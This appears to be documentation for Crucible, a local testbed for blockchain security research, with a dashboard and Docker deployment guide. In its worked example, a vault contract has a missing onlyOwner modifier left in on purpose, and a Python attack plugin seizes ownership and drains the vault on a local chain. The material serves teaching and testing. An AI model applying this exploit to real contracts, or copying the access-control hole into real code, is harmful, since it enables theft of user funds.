Fork an existing chain (e.g., Ethereum at block 19,000,000), then deploy your own contracts on top. Your contracts coexist with the forked state — you can interact with existing protocols AND deploy new ones.

Best for: Testing how your contract behaves in a realistic on-chain environment (existing DeFi protocols, token holders, historical state).

# testbed.local.yaml
chains:
  ethereum:
    rpc_url: "${ETH_RPC_URL}"
    fork_block: 19000000        # Fork real Ethereum state

docs.title: Mode 2: Blank Chain (No Fork)
docs.text:
Set fork_block: null to start a blank Anvil instance with no fork. Crucible omits the --fork-url flag entirely, giving you a clean EVM with:

  • No pre-deployed contracts — everything must be deployed from scratch
  • 10 pre-funded accounts (Anvil defaults, each with 10,000 ETH)
  • No RPC dependency — fully offline, instant startup
  • auto-impersonate enabled — send transactions from ANY address without a private key

Best for: Isolated contract testing, fuzzing, invariant testing, and auditing contracts before deployment.

# testbed.local.yaml
chains:
  ethereum:
    rpc_url: "${ETH_RPC_URL}"   # Still in config schema — not used when fork_block is null
    fork_block: null             # [star] Blank chain — no --fork-url passed to Anvil

Note: rpc_url is still required by the config schema even in blank-chain mode, but it is not used when fork_block is null.

docs.title: Worked Example: An Access Control Bug
docs.text: Let's build a complete example from scratch — a simple vault contract with a missing onlyOwner modifier on its setOwner() function. The attack plugin exploits this by calling setOwner() directly (no attacker contract needed), then drains the vault as the new owner.

docs.title: What You'll Create
docs.text:
contracts/VulnerableVault.sol           ← The vulnerable contract
scenarios/vault_pre_exploit/
  scenario.yaml                         ← The scenario (phases)
  DeployVault.s.sol                     ← Foundry deploy script
attacks/vault_access_control/
  vault_access_control.py               ← The attack plugin
  plugin.yaml                           ← Plugin manifest
experiments/vault_access_control_replay.yaml  ← Experiment wiring

docs.title: Step 1: Write the Contract
docs.text:
Create the contract in the Foundry source directory (contracts/, as defined in foundry.toml):

// contracts/VulnerableVault.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @notice A simple vault with a missing access control modifier.
///         The `setOwner()` function is PUBLIC instead of `onlyOwner`,
///         allowing anyone to transfer ownership and then drain the vault.
contract VulnerableVault {
    address public owner;
    mapping(address => uint256) public balances;

    event Deposited(address indexed user, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Withdrawn(address indexed user, uint256 amount);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    /// @notice Deposit ETH into the vault.
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    /// 🔴 BUG: Missing onlyOwner modifier — anyone can call this!
    function setOwner(address newOwner) external {
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    /// @notice Owner-only withdraw. Should be protected by onlyOwner
    ///         but depends on `owner` being set correctly.
    function ownerWithdraw(uint256 amount) external onlyOwner {
        require(balances[owner] >= amount, "insufficient balance");
        balances[owner] -= amount;
        (bool ok,) = payable(owner).call{value: amount}("");
        require(ok, "ETH transfer failed");
        emit Withdrawn(owner, amount);
    }

    /// @notice Check the vault's ETH balance.
    function vaultBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

Build it:

cd /home/testbed/crucible_testbed
forge build

Expected output: 

[⠊] Compiling...
[⠒] Compiling 1 files with 0.8.20
[⠢] Solc 0.8.20 finished in 1.23s
Compiler run successful!

docs.title: Step 2: Write the Deploy Script
docs.text:
Create a Foundry deploy script in the scenario directory:

// scenarios/vault_pre_exploit/DeployVault.s.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {VulnerableVault} from "../../contracts/VulnerableVault.sol";

/// @notice Deploys the VulnerableVault and funds a victim account.
///         Crucible injects the RPC URL via --rpc-url automatically.
contract DeployVault is Script {
    // Anvil default account #1 will be the "victim" (deposits funds)
    address constant VICTIM = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;

    function run() external {
        // ── 1. Deploy the vault (owner = deployer = account #0) ──
        vm.startBroadcast();
        VulnerableVault vault = new VulnerableVault();
        console.log("Vault deployed at:", address(vault));
        console.log("Initial owner:", vault.owner());
        vm.stopBroadcast();

        // ── 2. Fund the victim and deposit into vault ──
        vm.deal(VICTIM, 10 ether);
        vm.startBroadcast(VICTIM);
        vault.deposit{value: 5 ether}();
        console.log("Victim deposited 5 ETH");
        vm.stopBroadcast();

        // ── 3. Log the vault balance for verification ──
        console.log("Vault balance:", address(vault).balance);
        console.log("Victim balance in vault:", vault.balances(VICTIM));
    }
}

docs.title: Step 3: Create the Scenario
docs.text:
The scenario defines three phases: setup (deploy the vault), attack (plugin runs here), and verify:

# scenarios/vault_pre_exploit/scenario.yaml
name: vault_pre_exploit
description: >-
  Deploy a vulnerable vault contract to a blank chain, fund a victim account,
  then exploit the missing onlyOwner modifier to steal funds.
version: "1.0.0"
chains:
  - ethereum

phases:
  - name: setup
    steps:
      - type: log
        message: "Deploying VulnerableVault and funding victim account"
      - type: forge_script
        chain: ethereum
        script: "DeployVault.s.sol:DeployVault"

  - name: attack
    steps:
      - type: log
        message: "Attack plugin will exploit the access control bug"

  - name: verify
    steps:
      - type: log
        message: "Verification complete"

docs.title: Step 4: Write the Attack Plugin
docs.text:
The attack plugin is simple — impersonate a non-owner account, call setOwner() to steal ownership, then drain the vault:

# attacks/vault_access_control/vault_access_control.py
from crucible.rpc import JsonRpcClient
from crucible.sdk import AttackPlugin, AttackResult, ExperimentContext, VerificationResult

# ── Addresses ──────────────────────────────────────────────
# These are deterministic on a blank Anvil:
# - Account #0 deploys the vault (initial owner)
# - Account #5 is our "attacker" (no special privileges)
VAULT_ADDRESS = "0x..."   # Fill in after first run (see note below)
ATTACKER = "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC"  # Anvil account #5
VICTIM = "0x70997970C51812dc3A010C7d01b50e0d17dc79C8"    # Anvil account #1

# keccak256("setOwner(address)")[:4] = 0x13af4035
SET_OWNER_SELECTOR = "0x13af4035"
# keccak256("ownerWithdraw(uint256)")[:4] = 0x7a1a8e79
OWNER_WITHDRAW_SELECTOR = "0x7a1a8e79"


class VaultAccessControlAttack(AttackPlugin):
    def metadata(self) -> dict:
        return {
            "name": "vault_access_control",
            "version": "1.0.0",
            "type": "attack",
            "fidelity_level": "L3",
        }

    def execute(self, context: ExperimentContext, phase: int | None = None) -> AttackResult:
        rpc_url = context.chains.runtime_for("ethereum").rpc_url
        client = JsonRpcClient(rpc_url)

        # ── 1. Verify the vault is deployed ──
        code = client.get_code(VAULT_ADDRESS)
        if code == "0x":
            return AttackResult(success=False, error="Vault not deployed at expected address")

        # ── 2. Check initial state ──
        import json
        # Read owner slot (slot 0 for VulnerableVault)
        owner_slot = client.get_storage_at(VAULT_ADDRESS, "0x0")
        vault_balance = int(
            client.call("eth_getBalance", [VAULT_ADDRESS, "latest"]), 16
        )
        context.log.step(
            f"Initial state: owner={owner_slot}, vault_balance={vault_balance / 1e18} ETH",
            phase="attack", action="check", status="success",
        )

        # ── 3. Exploit: impersonate attacker and call setOwner() ──
        # Anvil has --auto-impersonate, so we can send as any address
        set_owner_data = SET_OWNER_SELECTOR + ATTACKER[2:].rjust(64, "0")
        client.send_transaction({
            "from": ATTACKER,
            "to": VAULT_ADDRESS,
            "data": set_owner_data,
        })
        context.log.step(
            f"Ownership transferred to attacker {ATTACKER}",
            phase="attack", action="exploit", status="success",
        )

        # ── 4. Drain the vault as the new owner ──
        # ownerWithdraw(uint256 amount)
        drain_data = OWNER_WITHDRAW_SELECTOR + hex(vault_balance)[2:].rjust(64, "0")
        client.send_transaction({
            "from": ATTACKER,
            "to": VAULT_ADDRESS,
            "data": drain_data,
        })
        context.log.step(
            f"Drained {vault_balance / 1e18} ETH from vault",
            phase="attack", action="drain", status="success",
        )

        # ── 5. Verify ──
        final_balance = int(
            client.call("eth_getBalance", [VAULT_ADDRESS, "latest"]), 16
        )
        attacker_balance = int(
            client.call("eth_getBalance", [ATTACKER, "latest"]), 16
        )

        if final_balance == 0:
            return AttackResult(success=True, phase_results=[
                {"step": "steal_ownership", "passed": True},
                {"step": "drain_vault", "passed": True,
                 "balance_before": vault_balance, "balance_after": final_balance},
            ])
        else:
            return AttackResult(
                success=False,
                error=f"Vault not fully drained: {final_balance} wei remaining",
            )

    def verify(self, context: ExperimentContext) -> VerificationResult:
        rpc_url = context.chains.runtime_for("ethereum").rpc_url
        client = JsonRpcClient(rpc_url)

        # Check vault is empty
        balance = int(
            client.call("eth_getBalance", [VAULT_ADDRESS, "latest"]), 16
        )
        # Check owner was changed
        owner_slot = client.get_storage_at(VAULT_ADDRESS, "0x0")
        owner_changed = owner_slot.lower() == ATTACKER.lower()

        return VerificationResult(
            passed=balance == 0 and owner_changed,
            assertions=[
                {"name": "vault_drained", "passed": balance == 0,
                 "expected": 0, "actual": balance},
                {"name": "owner_transferred", "passed": owner_changed,
                 "expected": ATTACKER, "actual": owner_slot},
            ],
            errors=[] if balance == 0 and owner_changed else [
                f"Vault balance: {balance}, owner changed: {owner_changed}",
            ],
        )

# attacks/vault_access_control/plugin.yaml
name: vault_access_control
type: attack
version: "1.0.0"
author: "your-name"
entry: vault_access_control.py
class: VaultAccessControlAttack
requires:
  crucible: ">=1.0.0"
  chains:
    - ethereum
  topology: single

Finding the vault address: The first time you run, the Foundry deploy script logs the address in the console. For subsequent runs, you can: - Use CREATE2 — deploy with a known salt so the address is deterministic - Query the deployer nonce — the vault is the first contract deployed by account #0, so it's at address(0xf39Fd..., nonce=1) = deterministic - Scrape the broadcast artifacts — Foundry saves receipts to broadcast/DeployVault.s.sol/<chain_id>/run-latest.json

For simplicity in this guide, hardcode the address after the first run. It won't change if you use the same deploy script and nonce.

docs.title: Step 5: Wire the Experiment
docs.text:
# experiments/vault_access_control_replay.yaml
name: vault_access_control_replay
scenario: vault_pre_exploit
attack: vault_access_control
topology: single
run:
  traces: true
  storage_diffs: true
  gas_profiling: true
tags:
  - vault
  - access-control
  - custom-contract

docs.title: Step 6: Run and Verify
docs.text:
# 1. Configure blank-chain mode
cat > testbed.local.yaml << 'EOF'
chains:
  ethereum:
    rpc_url: "${ETH_RPC_URL}"
    fork_block: null
    chain_id: 1
    port: 8545
    host: "127.0.0.1"
EOF

# 2. Build, clean, fork
forge build
uv run crucible clean --all
uv run crucible fork --topology single

# 3. Run the experiment
uv run crucible experiment run experiments/vault_access_control_replay.yaml \
  --no-baseline --tier saved --name vault-test-1

# 4. Check the report
LAST=$(ls -t logs/vault_access_control_replay/ | head -1)
echo "=== Run: $LAST ==="
cat "logs/vault_access_control_replay/$LAST/run_manifest.json" | python3 -m json.tool

# 5. Inspect artifact streams
echo "=== Events ==="
cat "logs/vault_access_control_replay/$LAST/chain_ethereum/events.jsonl"
echo "=== Gas ==="
cat "logs/vault_access_control_replay/$LAST/chain_ethereum/gas_profile.jsonl"
echo "=== Storage Diffs ==="
cat "logs/vault_access_control_replay/$LAST/chain_ethereum/storage_diffs.jsonl"

# 6. Run a second time and diff (prove determinism)
uv run crucible clean --all
uv run crucible fork --topology single
uv run crucible experiment run experiments/vault_access_control_replay.yaml \
  --no-baseline --tier saved --name vault-test-2

RUN_A=$(ls -t logs/vault_access_control_replay/ | tail -1)
RUN_B=$(ls -t logs/vault_access_control_replay/ | head -1)
uv run crucible diff "$RUN_A" "$RUN_B"

# 7. Export and verify
uv run crucible export "$RUN_B"
uv run crucible verify "datasets/$RUN_B"

Expected output for the diff: 

{
  "storage_equal": true,
  "events_equal": true,
  "gas_equal": true,
  "balances_equal": true
}

All four must be true for a deterministic reproduction. The events should show OwnershipTransferred followed by Withdrawn. Storage diffs should show slot 0 (owner) changing from deployer to attacker.

docs.title: Blank-Chain Mode (No Fork)
docs.text:
Setting fork_block: null starts Anvil without --fork-url. This gives you a completely isolated EVM:

  • No historical state — no pre-deployed contracts, no token holders, no DeFi protocols
  • Full control — every contract on the chain is one you deployed
  • Instant startup — no RPC fetching, Anvil starts in < 1 second
  • Perfect isolation — no external dependencies, fully reproducible anywhere
  • Offline capable — no archive node needed

docs.title: Config
docs.text:
# testbed.local.yaml
chains:
  ethereum:
    rpc_url: "${ETH_RPC_URL}"   # Still required by the config schema (unused when fork_block is null)
    fork_block: null             # [star] Triggers blank-chain mode
    chain_id: 1
    port: 8545
    host: "127.0.0.1"
    determinism:
      gas_price: 0
      block_base_fee: 1000000000
      auto_mine: true
      order: "fifo"

docs.title: What You Get
docs.text:
• 10 pre-funded accounts with 10,000 ETH each are available (Anvil defaults). Note: Crucible launches Anvil with --accounts 0 --balance 0 to avoid automatic dev accounts, but you can enable them via testbed.yaml: 
    chains:
  ethereum:
    anvil_flags:
      - "--accounts"
      - "10"
      - "--balance"
      - "10000"
    The worked example below uses vm.deal() in the Foundry deploy script to fund the victim account directly, which works regardless of Anvil's initial account setup.
  • No pre-deployed contracts — deploy everything from scratch
  • auto-impersonate enabled — send transactions from ANY address without a private key
  • --order fifo — transactions processed in deterministic order
  • --gas-price 0 — no gas costs during testing
  • --block-base-fee 1000000000 — 1 gwei base fee

docs.title: Iterating On Contracts
docs.text:
The power of Crucible for custom contract testing is the iterate loop:

flowchart LR
    A["1. Modify<br>contract"] --> B["2. Rebuild<br>forge build"]
    B --> C["3. Re-fork<br>clean --all<br>fork"]
    C --> D["4. Re-run<br>experiment<br>run"]
    D --> E["5. Check<br>artifacts,<br>diff, export"]
# One-shot iteration command
uv run crucible clean --all && \
uv run crucible fork --topology single && \
uv run crucible experiment run experiments/vault_access_control_replay.yaml \
  --no-baseline --tier saved --name vault-iteration-3

For rapid iteration, create a helper script:

#!/usr/bin/env bash
# scripts/iterate.sh
set -euo pipefail
cd "$(dirname "$0")/.."

echo "=== Building contracts ==="
forge build

echo "=== Cleaning state ==="
uv run crucible clean --all

echo "=== Forking ==="
uv run crucible fork --topology single

echo "=== Running experiment ==="
NAME="vault-$(date +%H%M%S)"
uv run crucible experiment run experiments/vault_access_control_replay.yaml \
  --no-baseline --tier saved --name "$NAME"

echo "=== Latest run: $NAME ==="

docs.title: Pattern 1: Deploy From The Attack Plugin (Pure Python)
docs.text:
Skip the Forge script entirely — deploy contracts programmatically from Python using forge create:

def _deploy_contract(client: JsonRpcClient, contract_path: str, from_addr: str) -> str:
    """Compile and deploy a Solidity contract via forge create."""
    import subprocess, json

    # Compile the contract
    result = subprocess.run(
        ["forge", "build", "--contracts", contract_path, "--json"],
        capture_output=True, text=True, check=True,
    )
    artifacts = json.loads(result.stdout)
    bytecode = artifacts["bytecode"]["object"]

    # Deploy via raw transaction
    # Foundry's bytecode.object already includes the 0x prefix —
    # do NOT prepend another "0x" or Anvil will reject it.
    tx_hash = client.send_transaction({
        "from": from_addr,
        "data": bytecode,
        "gas": hex(2_000_000),
    })

    # Get deployed address from receipt
    receipt = client.call("eth_getTransactionReceipt", [tx_hash])
    return receipt["contractAddress"]

docs.title: Pattern 2: Snapshot/Restore For Multi-Phase Testing
docs.text:
Reset chain state between test phases without re-forking:

def execute(self, context, phase=None):
    client = JsonRpcClient(...)

    # Take a snapshot before the attack
    snapshot_id = client.call("evm_snapshot", [])

    # Run attack attempt 1
    self._phase_one(client)

    # Restore to pre-attack state
    client.call("evm_revert", [snapshot_id])


    # Run attack attempt 2 (same starting state)
    self._phase_two(client)

docs.title: Pattern 3: Multi-Contract Deploy Script
docs.text:
Deploy several interdependent contracts in one script:

// scenarios/defi_test/DeployAll.s.sol
contract DeployAll is Script {
    function run() external {
        vm.startBroadcast();

        Token token = new Token("Test", "TST");
        Vault vault = new Vault(address(token));
        Router router = new Router(address(vault));

        console.log("Token:", address(token));
        console.log("Vault:", address(vault));
        console.log("Router:", address(router));

        vm.stopBroadcast();
    }
}

docs.title: Pattern 4: CREATE2 For Deterministic Addresses
docs.text:
Deploy with a known salt so the contract address is predictable — no hardcoding needed:

// Deploy with CREATE2
bytes32 salt = keccak256("vault-v1");
VulnerableVault vault = new VulnerableVault{salt: salt}();

The address is keccak256(0xff ++ deployer ++ salt ++ keccak256(init_code))[12:] — computable in Python so your attack plugin knows it before deployment.

docs.title: Best Practices
docs.text:
1. Always build before forking — forge build must succeed before Crucible runs your deploy script.

  2. Use --tier saved for important tests — protects artifacts from crucible clean --all.

  3. Run twice and diff — always confirm determinism with crucible diff. Non-deterministic results indicate a problem (block.timestamp dependency, uninitialized storage, etc.).

  4. Log everything — every context.log.step() call creates a line in the experiment report.

  5. Prefer forge_script for deployment — Solidity is cleaner than raw bytecode. Use Python for exploit/verification logic.

  6. Test on blank chain first — eliminates external variables. Move to forked-chain mode only when you need real protocol state.

  7. Use CREATE2 for deterministic addresses — avoids the fragile "hardcode after first run" workflow.

  8. Pin your fork block — even in blank-chain mode, setting fork_block deterministically (use null for truly blank, or a specific number for reproducibility).

docs.title: Troubleshooting
docs.text: Symptom Likely Cause Fix anvil not found on PATH Foundry not installed foundryup or check Docker setup Contract not found or get_code returns 0x Deploy script didn't run or wrong address Check forge_script step ran in the logs. Foundry saves receipts in broadcast/DeployVault.s.sol/<chain_id>/run-latest.json. No matching function signature Wrong function selector Check your ABI encoding. cast sig "setOwner(address)" prints 0x13af4035. Non-deterministic diff Block.timestamp dependency, tx.origin usage, or blockhash Pin timestamp via evm_setNextBlockTimestamp or use Crucible's determinism config forge build fails Solidity version mismatch, missing imports Check foundry.toml for correct evm_version and libs VM Exception: revert Transaction reverted Check calldata, account balance, and contract state. Use cast call to debug. Artifacts lost after clean --all Run wasn't saved Use --tier saved or --tier published. See CLI Reference. fork_block: null still forks Config not applied Make sure testbed.local.yaml is in the project root and has the correct YAML structure

docs.title: See Also
docs.text: Doc What It Covers docs/SCENARIO_AUTHORING.md Complete reference for all scenario step types docs/ATTACK_PACK_GUIDE.md Writing attack plugins, evidence files, and plugin manifests docs/REPRODUCIBILITY.md Provenance, determinism, and the full experiment lifecycle docs/CLI_REFERENCE.md All CLI commands and options docs/TUTORIAL.md Nomad exploit replay tutorial (the original use case) foundry.toml Foundry project configuration

docs.title: Crucible Dashboard Guide
docs.text: Purpose: Launch and navigate the Streamlit-based command center. Commands: crucible dashboard or streamlit run dashboard/app.py

docs.title: Quick Start
docs.text:
# Install dependencies  (ui extra transitively includes analysis)
pip install "crucible[ui]"
# or: uv sync --extra ui

# Launch the dashboard
crucible dashboard

# Or directly with Streamlit
streamlit run dashboard/app.py --server.port 8501

The dashboard opens at http://localhost:8501.

docs.title: Navigation
docs.text: The sidebar provides 19 panels organized into functional areas:

docs.title: 🔬 Overview
docs.text: Panel Description Overview Project summary, quick actions, and recent run metrics.

docs.title: 🎛️ Command Center & Experiments
docs.text: Panel Description Run Experiment Select an experiment YAML, configure mode (single/matrix), set flags (--no-baseline, --publication-mode), and run with real-time output streaming. Control Panel Chain management (fork, status, setup, reset), baseline capture/verify, cleanup (cache/states/checkpoints), and export runs. Experiment History Filterable table with outcome/attack/timeline charts, CSV download.

docs.title: 📡 Monitoring
docs.text: Panel Description Chain Monitor Real-time Anvil chain status, block numbers, and health checks. Topology View Visual topology graph showing connected chains and bridge plugins. Agent Reasoning LLM agent reasoning traces and tool call history.

docs.title: 📊 Analysis
docs.text: Panel Description Run Details Select a run to see its manifest, gas profile chart, and all 6 JSONL artifact streams in tabs. Compare Runs Side-by-side comparison of run.jsonl, events.jsonl, storage_diffs.jsonl, and gas_profile.jsonl for determinism verification. Log Browser Browse raw JSONL streams from any log directory. Estimates Estimate RPC requests and cache size for an experiment before running it.

docs.title: 🩺 Diagnostics
docs.text: Panel Description Doctor Run environment validation checks (Foundry, Python, config, ports) with pass/fail metrics. Evidence View attack evidence metadata, fidelity levels, and damage estimates.

docs.title: 🔧 Tools
docs.text: Panel Description Checkpoints View saved checkpoints by run ID. Attack Extract Auto-generate an attack pack scaffold from an on-chain transaction hash. Bundle Management Hash and verify publication bundle integrity. Cache Management Inspect, fingerprint, verify, and clean the fork cache. ABI Registry List, validate, and fetch contract ABIs from Etherscan/Sourcify. Plugin Validation List and validate all discovered plugins.

docs.title: Job Manager
docs.text:
When you run a CLI operation from the dashboard (e.g., experiment run, fork, doctor), the job runs in a background thread with real-time output streaming. The sidebar shows the current job status:

  • [setup] Running — Auto-refreshes every 2 seconds with a toast notification
  • [ok] Success — Shows line count
  • [fail] Failed — Shows return code
  • 🛑 Terminated — Manual stop

You can terminate any running job from its panel.

docs.title: Theme
docs.text: Toggle between light and dark mode in the sidebar.

docs.title: Architecture
docs.text:
dashboard/
  app.py              # Streamlit entry point (sidebar nav, routing, theme)
  state.py            # Job manager (background CLI execution, output streaming)
  components.py       # Shared helpers (JSONL loaders, charts, global state)
  panels/
    overview.py       # Metrics, charts, recent runs, attack pack cards
    operations.py     # Run Experiment, Control Panel
    analysis.py       # History, Run Details, Compare Runs, Log Browser
    diagnostics.py    # Doctor, Estimates, Evidence
    tools.py          # Extract, Bundle, Cache, ABI, Plugin, Checkpoints

docs.title: Deployment Guide
docs.text: How to deploy Crucible on a target system via SSH and Docker. Last updated: June 2026

docs.title: Table of Contents
docs.text:
1. Prerequisites
  2. SSH Clone
  3. Docker Setup
  4. Running with Docker Compose
  5. Running Unit Tests in Docker
  6. Environment Configuration
  7. Production Deployment
  8. Troubleshooting

docs.title: Target System Requirements
docs.text: Requirement Minimum Recommended OS Linux (Ubuntu 22.04+) Ubuntu 24.04 LTS CPU 2 cores 4+ cores RAM 8 GB 16 GB Disk 20 GB free 100 GB+ SSD Python 3.11 3.12 Docker 24.0+ 27.0+ Docker Compose v2.24+ v2.29+

docs.title: Required Tools
docs.text:
# Install Docker (Ubuntu/Debian)
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo usermod -aG docker $USER
# Log out and back in, or run: newgrp docker

# Verify installation
docker --version
docker compose version

docs.title: Required Access
docs.text:
• SSH key configured on the target system for passwordless login
  • Git access to the repository (public or private)
  • Archive RPC URL for chain forking (see RPC Provider Guide)

docs.title: 2. SSH Clone
docs.text:
Clone the repository to the target system via SSH:

# One-time setup: add the target system's SSH key to your GitHub/GitLab account

# Clone with SSH
git clone git@github.com:crucible/testbed.git crucible
# Or for a private repo:
# git clone git@github.com:your-org/crucible.git crucible

cd crucible

# Verify the clone
git log --oneline -5
git status

docs.title: Using a Deployment Key
docs.text:
For automated deployments, create a dedicated SSH deploy key:

# On the target system, generate a key (no passphrase for automation)
ssh-keygen -t ed25519 -C "crucible-deploy" -f ~/.ssh/crucible_deploy_key

# Add the public key (~/.ssh/crucible_deploy_key.pub) to your Git provider:
# - GitHub: Repository → Settings → Deploy Keys → Add deploy key
# - GitLab: Repository → Settings → Repository → Deploy Keys

# Configure SSH to use the deploy key
cat >> ~/.ssh/config << 'EOF'
Host github.com
    HostName github.com
    IdentityFile ~/.ssh/crucible_deploy_key
    IdentitiesOnly yes
EOF

docs.title: Keeping the Clone Updated
docs.text:
# Pull latest changes
git pull origin master

# Or use a deployment script (scripts/ae_up.sh)
./scripts/ae_up.sh

docs.title: Option A: Quick Start with Docker Compose
docs.text:
cd crucible

# 1. Configure environment
cp .env.example .env
# Edit .env with your RPC URLs:
#   ETH_RPC_URL=https://eth.llamarpc.com

# 2. Build the Docker images
docker compose build orchestrator
docker compose build dashboard

# 3. Verify the build
docker compose run --rm orchestrator doctor

docs.title: Option B: Build and Run Script
docs.text:
Use the pre-built scripts for a complete setup:

# Build and run a full end-to-end demo
./scripts/ae_up.sh

This script will: 1. Build the Docker images 2. Run crucible doctor to validate the environment 3. Run unit tests inside the container 4. Start the dashboard and chain services

docs.title: .dockerignore
docs.text: The project includes a .dockerignore file that excludes: - .venv/ — prevents host Python environment from overriding the container's - states/, logs/, datasets/, .fork_cache/, cache/, out/ — runtime generated files - .git/, .gitignore, .gitmodules — version control - __pycache__/, *.pyc, .pytest_cache/ — Python cache files - .env — secrets and credentials - *.md — documentation (not needed at runtime)

docs.title: Basic Commands
docs.text:
# Run crucible commands
docker compose run --rm orchestrator doctor
docker compose run --rm orchestrator status
docker compose run --rm orchestrator init
docker compose run --rm orchestrator plugin list
docker compose run --rm orchestrator experiment run experiments/demo_experiment.yaml --no-baseline

# Start the dashboard
docker compose up -d dashboard
# Open http://localhost:8501 in your browser

# Start Anvil chains (requires .env with RPC URLs)
docker compose up -d anvil-ethereum
docker compose up -d anvil-polygon

# View logs
docker compose logs -f orchestrator

# Stop all services
docker compose down

docs.title: Running with Full Chain Support
docs.text:
# docker-compose.override.yml (local file, gitignored)
# Start the chains you need:
docker compose up -d anvil-ethereum
docker compose up -d anvil-polygon

# Then run experiments:
docker compose run --rm orchestrator experiment run experiments/nomad_replay.yaml

docs.title: The Entrypoint Script
docs.text:
When you run any docker compose run --rm orchestrator <command>, the container:

  1. Runs uv sync — syncs the frozen environment (all extras: dev, ui, analysis)
  2. This ensures the container has all dependencies even if the host's .venv/ is mounted
  3. Takes ~3-5 seconds on first run, then cached
  4. Executes the command via uv run crucible <command>

This means docker compose run --rm orchestrator doctor is equivalent to running crucible doctor on a properly set up local environment.

docs.title: 5. Running Unit Tests in Docker
docs.text:
# Run all unit tests (520+ tests)
docker compose run --rm --entrypoint bash orchestrator -c "\
  cd /workspace && \
  uv run pytest tests/unit/ -q --tb=short"

# Run specific test file
docker compose run --rm --entrypoint bash orchestrator -c "\
  cd /workspace && \
  uv run pytest tests/unit/test_config.py -v"

# Run with coverage
docker compose run --rm --entrypoint bash orchestrator -c "\
  cd /workspace && \
  uv run pytest tests/unit/ --cov=crucible --cov-report=term"

Note: Dashboard e2e tests (test_dashboard_e2e.py) are excluded from the Docker smoke test because they require the Streamlit testing framework's runtime environment. These pass when run locally.

docs.title: Required Environment Variables
docs.text:
Create .env from the template:

cp .env.example .env

At minimum, set ETH_RPC_URL to an archive-node RPC provider:

# Required for chain forking
ETH_RPC_URL=https://eth.llamarpc.com

docs.title: Optional Variables
docs.text:
# Multi-chain support
POLYGON_RPC_URL=https://polygon.llamarpc.com
BSC_RPC_URL=https://bsc.publicnode.com
HARMONY_RPC_URL=https://harmony.publicnode.com

# Paid providers (higher rate limits)
ALCHEMY_KEY=your_key_here

# Etherscan API key (for ABI fetching)
ETHERSCAN_API_KEY=your_key_here

# LLM API keys (for autonomous agent experiments)
OPENAI_API_KEY=sk-...
ANTHROPIC_API_KEY=sk-ant-...

docs.title: Provider Notes
docs.text: Provider Free Tier Rate Limit Archive Support Best For LlamaRPC 25 req/s [ok] Yes Development, single-chain Ankr 15 req/s [ok] Yes Fallback provider PublicNode 10 req/s [ok] Yes Last resort fallback Alchemy 30 req/s (free tier) [ok] Yes Production, multi-chain Infura 25 req/s (free tier) [ok] Yes Production, multi-chain

docs.title: Docker Compose with Override
docs.text:
For production environments, create docker-compose.override.yml (gitignored):

version: "3.8"
services:
  dashboard:
    ports:
      - "8501:8501"
    restart: always
    environment:
      - STREAMLIT_SERVER_RUNONSAVE=false

  anvil-ethereum:
    restart: always
    ports:
      - "8545:8545"

  anvil-polygon:
    restart: always
    ports:
      - "8546:8546"

docs.title: Running as a Service
docs.text:
Create a systemd service file (/etc/systemd/system/crucible.service):

[Unit]
Description=Crucible Bridge Security Research Testbed
After=docker.service
Requires=docker.service

[Service]
WorkingDirectory=/opt/crucible
ExecStart=/usr/bin/docker compose up -d
ExecStop=/usr/bin/docker compose down
Restart=always
User=root
Group=docker

[Install]
WantedBy=multi-user.target

Then:

sudo systemctl daemon-reload
sudo systemctl enable crucible
sudo systemctl start crucible
sudo systemctl status crucible

docs.title: Resource Limits
docs.text:
Configure Docker resource limits in /etc/docker/daemon.json:

{
  "default-shm-size": "256m",
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  }
}

docs.title: Monitoring
docs.text:
# Check container health
docker compose ps

# View resource usage
docker stats

# Check disk usage
docker compose run --rm orchestrator status --disk

# View logs
docker compose logs -f --tail=100

docs.title: Common Issues
docs.text: Symptom Cause Fix ModuleNotFoundError: No module named 'streamlit' Host .venv/ mounted over container's The entrypoint script handles this automatically. If still failing, run docker compose build --no-cache orchestrator pytest: command not found Missing dev dependencies The entrypoint installs --extra dev. If still failing, run docker compose build --no-cache orchestrator anvil: command not found Foundry not installed in Docker Run docker compose build --no-cache orchestrator to re-install Foundry Error: No such service: anvil-ethereum Anvil services not started Run docker compose up -d anvil-ethereum first Connection refused on RPC Anvil not ready yet Wait 30-60s for Anvil to finish forking. Check with docker compose logs anvil-ethereum Port 8501 already in use Another Streamlit instance running Change port: docker compose run --rm -p 8502:8501 dashboard Build fails with uv lock --frozen error Lockfile out of sync Run uv lock locally, commit the updated uv.lock, then rebuild

docs.title: Checking Container Health
docs.text:
# Check if container is running
docker compose ps

# Check logs
docker compose logs orchestrator --tail=50

# Run a quick health check
docker compose run --rm orchestrator doctor

# Verify Python environment
docker compose run --rm --entrypoint bash orchestrator -c "\
  uv run python -c \"import streamlit; print('streamlit OK')\" && \
  uv run python -c \"import pandas; print('pandas OK')\" && \
  uv run python -c \"import crucible; print('crucible OK')\""

docs.title: Resetting the Environment
docs.text:
# Stop everything
docker compose down -v  # -v removes volumes (states, logs, cache)

# Rebuild from scratch
docker compose build --no-cache orchestrator

# Start fresh
docker compose run --rm orchestrator init

docs.title: Getting Help
docs.text:
• User Guide: docs/USER_GUIDE.md
  • Operations Runbook: docs/OPERATIONS_RUNBOOK.md
  • Maintenance Guide: docs/MAINTENANCE.md
  • Docker Documentation: docs/internal/DOCKER_IMPLEMENTATION.md

docs.title: Feature Guide
docs.text: Audience: Researchers and users who want to understand what each Crucible feature does, why it matters, and how to use it.

docs.title: How to Read This Guide
docs.text:
Each feature is documented with three sections:

Section Answers What It Is The feature's purpose and mechanism Why It Matters The problem it solves and why you should care How to Use It Practical steps, commands, and configuration

docs.title: What It Is
docs.text:
